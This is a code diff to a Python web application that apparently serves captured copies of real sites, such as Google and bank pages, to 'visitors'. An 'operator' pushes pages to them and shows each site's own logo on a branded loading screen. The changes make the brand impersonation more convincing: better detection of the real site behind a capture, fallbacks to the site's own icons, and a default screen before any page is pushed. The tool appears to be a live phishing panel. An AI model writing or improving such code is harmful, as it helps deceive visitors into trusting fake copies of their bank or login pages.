@@ -2973,51 +2973,141 @@ def _page_base_href(html: str) -> str:
     return base or ""
 
 
-def _host_from_html(html: str) -> str:
-    """The site a captured page belongs to.
+_BASE_HREF_RE = re.compile(
+    r"""<base\b[^>]*\bhref\s*=\s*["']([^"']+)["']""", re.IGNORECASE)
+_CANONICAL_TAG_RE = re.compile(
+    r"""<link\b[^>]*\brel\s*=\s*["']?canonical["']?[^>]*>""", re.IGNORECASE)
+_HREF_ATTR_RE = re.compile(r"""\bhref\s*=\s*["']([^"']+)["']""", re.IGNORECASE)
+_OG_URL_TAG_RE = re.compile(
+    r"""<meta\b[^>]*\b(?:property|name)\s*=\s*["'](?:og:url|twitter:url)["'][^>]*>""",
+    re.IGNORECASE)
+_CONTENT_ATTR_RE = re.compile(r"""\bcontent\s*=\s*["']([^"']+)["']""", re.IGNORECASE)
 
-    A capture keeps the original page's absolute URLs (assets, links, often a
-    <base href>), so the host is right there. <base> wins because it is the
-    authoritative origin the page itself declared.
-    """
-    if not html:
+_HOST_SCAN_BYTES = 400000
+_HOST_SCAN_LIMIT = 12
+
+
+def _host_of(url: str) -> str:
+    """Bare host of a URL, or "" when it has none. Never raises."""
+    try:
+        host = (urlsplit(url or "").hostname or "").strip().lower()
+    except Exception:
         return ""
-    candidates = [_page_base_href(html)]
-    m2 = _URL_IN_HTML_RE.search(html[:400000])
-    if m2:
-        candidates.append(m2.group(0))
-    for raw in candidates:
-        try:
-            host = (urlsplit(raw).hostname or "").strip().lower()
-        except Exception:
-            host = ""
-        if host and "." in host:
+    if not host or "." not in host:
+        return ""
+    return host
+
+
+def _declared_host(html: str, raw: str, tag_re) -> str:
+    """Host from the first tag matching `tag_re` that carries a usable URL."""
+    for tag in tag_re.findall(html[:_HOST_SCAN_BYTES]):
+        m = _HREF_ATTR_RE.search(tag) or _CONTENT_ATTR_RE.search(tag)
+        if not m:
+            continue
+        host = _host_of(m.group(1))
+        if host:
             return host
     return ""
 
 
-def _page_domain(page_id: str) -> str:
-    """Host of an archived page (cached until the page changes)."""
+def _hosts_in_html(html: str) -> List[str]:
+    """Every host a page belongs to, most likely first.
+
+    A capture is not a clean statement of where it came from: the *first*
+    absolute URL in google.com's markup is often a gstatic.com asset, so
+    "first URL wins" puts a CDN in charge and the site's own configuration
+    never applies. So the order is:
+
+      1. the origin the page declared with <base href>;
+      2. <link rel="canonical"> and og:url / twitter:url — the page's own address;
+      3. every other absolute URL, by how often it appears (a page mentions its
+         own site far more often than any single asset host).
+
+    The caller walks the list and takes the first host the operator has
+    configured, which is why an asset host in front of the real one is harmless.
+    """
+    if not html:
+        return []
+    head = html[:_HOST_SCAN_BYTES]
+    order: List[str] = []
+
+    def add(host: str) -> None:
+        if host and host not in order:
+            order.append(host)
+
+    m = _BASE_HREF_RE.search(head)
+    if m:
+        add(_host_of(m.group(1)))
+    add(_declared_host(head, head, _CANONICAL_TAG_RE))
+    add(_declared_host(head, head, _OG_URL_TAG_RE))
+
+    counts: Dict[str, int] = {}
+    first_seen: Dict[str, int] = {}
+    for index, raw in enumerate(_URL_IN_HTML_RE.findall(head)):
+        host = _host_of(raw)
+        if not host:
+            continue
+        counts[host] = counts.get(host, 0) + 1
+        first_seen.setdefault(host, index)
+    for host in sorted(counts, key=lambda h: (-counts[h], first_seen[h])):
+        add(host)
+
+    return order[:_HOST_SCAN_LIMIT]
+
+
+def _host_from_html(html: str) -> str:
+    """The site a captured page most likely belongs to ("" when unknown)."""
+    hosts = _hosts_in_html(html)
+    return hosts[0] if hosts else ""
+
+
+def _page_hosts(page_id: str) -> List[str]:
+    """Every host an archived page belongs to, best first (cached)."""
     page_id = (page_id or "").strip()
     if not page_id:
-        return ""
+        return []
     try:
         page = lpv_store.get_page(page_id)
     except Exception:
-        return ""
+        return []
     if not page:
-        return ""
+        return []
     key = str(page.get("updated_at") or "")
     cached = _PAGE_DOMAIN_CACHE.get(page_id)
     if cached and cached[0] == key:
-        return cached[1]
+        return list(cached[1])
     try:
         html = lpv_store.read_page_html(page_id) or ""
     except Exception:
         html = ""
-    host = _host_from_html(html)
-    _PAGE_DOMAIN_CACHE[page_id] = (key, host)
-    return host
+    hosts = _hosts_in_html(html)
+    _PAGE_DOMAIN_CACHE[page_id] = (key, tuple(hosts))
+    return hosts
+
+
+def _page_domain(page_id: str) -> str:
+    """The host of an archived page the panel shows (cached)."""
+    hosts = _page_hosts(page_id)
+    return hosts[0] if hosts else ""
+
+
+def _domain_config_for_page(page_id: str) -> Optional[Dict[str, Any]]:
+    """The domain configuration that applies to an archived page.
+
+    "Applies" is not the same as "the first host in the markup": a Google
+    capture is full of gstatic.com assets, a bank's page may open with an
+    Akamai URL. Every host the page mentions is tried in turn, and the first
+    one the operator has configured wins — so a site's loading screen is found
+    even when the page's first URL belongs to its CDN.
+    """
+    for host in _page_hosts(page_id):
+        try:
+            cfg = lpv_store.find_domain(host)
+        except Exception:
+            cfg = None
+        if cfg:
+            return cfg
+    return None
 
 
 def _absolute(url: str, base: str) -> str:
@@ -3146,7 +3236,7 @@ def _logo_from_pages(domain: str) -> str:
         if not pid:
             continue
         try:
-            if not lpv_store.domain_matches(_page_domain(pid), key):
+            if not any(lpv_store.domain_matches(h, key) for h in _page_hosts(pid)):
                 continue
             _host, candidates = _page_logo_candidates(pid)
         except Exception:
@@ -3209,12 +3299,15 @@ def _brand_spinner_html(cfg: Dict[str, Any]) -> str:
     # first letter of the name on a plain tile.
     fallbacks = []
     if domain:
-        favicon = f"https://{domain}/favicon.ico"
-        if favicon != logo:
-            fallbacks.append(favicon)
+        # A site that ships nothing else still answers at these two paths, in
+        # this order: the touch icon is a real 180px image on most sites, and
+        # favicon.ico is the floor. A missing file moves to the next candidate
+        # instead of leaving a broken box.
+        for guess in (f"https://{domain}/apple-touch-icon.png",
+                      f"https://{domain}/favicon.ico"):
+            if guess != logo and guess not in fallbacks:
+                fallbacks.append(guess)
     initial = (label or domain or "?").strip()[:1].upper()
-    fallback_js = json_lib.dumps(fallbacks)
-    initial_js = json_lib.dumps(initial)
     return (
         "<!doctype html><html><head><meta charset=\"utf-8\">"
         "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, viewport-fit=cover\">"
@@ -3234,10 +3327,15 @@ def _brand_spinner_html(cfg: Dict[str, Any]) -> str:
         "@keyframes sweep{0%{transform:translateX(-100%)}100%{transform:translateX(340%)}}"
         "@media (prefers-color-scheme:dark){html,body{background:#fff}}"
         "</style></head><body><div class=\"wrap\">"
-        f"<img class=\"mark\" src=\"{logo_attr}\" alt=\"\" width=\"76\" height=\"76\" "
-        f"onerror=\"(function(img){{var f={fallback_js};if(img.dataset.fb){{img.style.display='none';"
-        f"var t=document.getElementById('dm-initial');if(t)t.style.display='flex';return;}}"
-        f"img.dataset.fb='1';img.src=f[0]||'';}})(this)\">"
+        "<img class=\"mark\" src=\"" + logo_attr + "\" alt=\"\" width=\"76\" height=\"76\" "
+        # Walk the fallback queue one entry per error, then give up on the
+        # image and show the letter tile. Built by concatenation so the JSON
+        # array is never reinterpreted as an f-string.
+        + "onerror=\"(function(img){var q=" + json_lib.dumps(fallbacks)
+        + ";var i=(parseInt(img.dataset.fb||'0',10)||0)+1;img.dataset.fb=i;"
+        "if(q[i-1]){img.src=q[i-1];return;}"
+        "img.style.display='none';var t=document.getElementById('dm-initial');"
+        "if(t){t.style.display='flex';}})(this)\">"
         f"<div id=\"dm-initial\" class=\"initial\" style=\"display:none\">{html_lib.escape(initial)}</div>"
         + (f"<div class=\"name\">{label_html}</div>" if label_html else "")
         + "<div class=\"bar\"></div></div></body></html>"
@@ -3269,13 +3367,7 @@ def _domain_spinner_url_for_page(page_id: str) -> str:
     while the page downloads — the same one the visitor saw at boot, so a
     multi-step flow keeps one identity instead of dropping back to our ring.
     """
-    host = _page_domain(page_id)
-    if not host:
-        return ""
-    try:
-        cfg = lpv_store.find_domain(host)
-    except Exception:
-        cfg = None
+    cfg = _domain_config_for_page(page_id)
     if not cfg:
         return ""
     return f"/api/lpv/domains/{cfg['domain']}/spinner.html"
@@ -3309,11 +3401,33 @@ def _domain_loading(wf: Optional[dict]) -> Tuple[str, str, Optional[Dict[str, An
     page_id = _boot_page_id(wf)
     if not page_id:
         return "", "", None
-    host = _page_domain(page_id)
-    if not host:
+    cfg = _domain_config_for_page(page_id)
+    if not cfg:
+        return "", "", None
+    html = _domain_spinner_for(cfg)
+    if not html:
+        return "", "", None
+    return html, f"/api/lpv/domains/{cfg['domain']}/spinner.html", cfg
+
+
+def _sole_domain_loading() -> Tuple[str, str, Optional[Dict[str, Any]]]:
+    """The loading screen to use when the visit's page is not known yet.
+
+    A visitor can open client.html before the operator pushes anything and
+    without a workflow naming the landing page. If exactly one site is
+    configured with a loading screen that is unambiguously the one they should
+    see, so it is embedded instead of our own branded ring. Two or more sites
+    and there is no honest answer — the runtime swaps the right one in as soon
+    as a page is pushed.
+    """
+    try:
+        domains = [row for row in lpv_store.list_domains() if row.get("enabled")]
+    except Exception:
+        return "", "", None
+    if len(domains) != 1:
         return "", "", None
     try:
-        cfg = lpv_store.find_domain(host)
+        cfg = lpv_store.get_domain(domains[0].get("domain") or "")
     except Exception:
         cfg = None
     if not cfg:
@@ -3339,6 +3453,12 @@ def _lpv_boot_loading(wf: Optional[dict]) -> tuple:
     if html:
         return html, url
     html, url, _cfg = _domain_loading(wf)
+    if html:
+        return html, url
+    # No workflow and no landing page: with a single configured site there is
+    # only one screen the visitor can be waiting behind, so use it. This is the
+    # "open the client link, push a page by hand" path.
+    html, url, _cfg = _sole_domain_loading()
     if html:
         return html, url
     try:
@@ -8201,12 +8321,30 @@ async def lpv_workflow_redirect_html(workflow_id: str):
 
 @app.get("/api/lpv/domains")
 async def lpv_domains_list():
-    """Every configured domain, without the (large) uploaded HTML."""
+    """Every configured domain, without the (large) uploaded HTML.
+
+    Each row also carries `resolved_logo` — the mark the visitor will actually
+    see (the operator's URL, else the best icon in a capture of that site, else
+    the site's favicon) — so the panel can show the truth instead of an empty
+    box, and `spinner_url` so the panel can preview the exact document.
+    """
     try:
-        return {"domains": lpv_store.list_domains()}
+        rows = lpv_store.list_domains()
     except Exception:
         logger.debug("[lpv] domain list failed", exc_info=True)
         return {"domains": []}
+    out = []
+    for row in rows:
+        item = dict(row)
+        domain = str(item.get("domain") or "")
+        try:
+            cfg = lpv_store.get_domain(domain) or item
+            item["resolved_logo"] = _domain_logo(cfg)
+        except Exception:
+            item["resolved_logo"] = ""
+        item["spinner_url"] = f"/api/lpv/domains/{domain}/spinner.html"
+        out.append(item)
+    return {"domains": out}
 
 
 @app.get("/api/lpv/domains/{domain}")
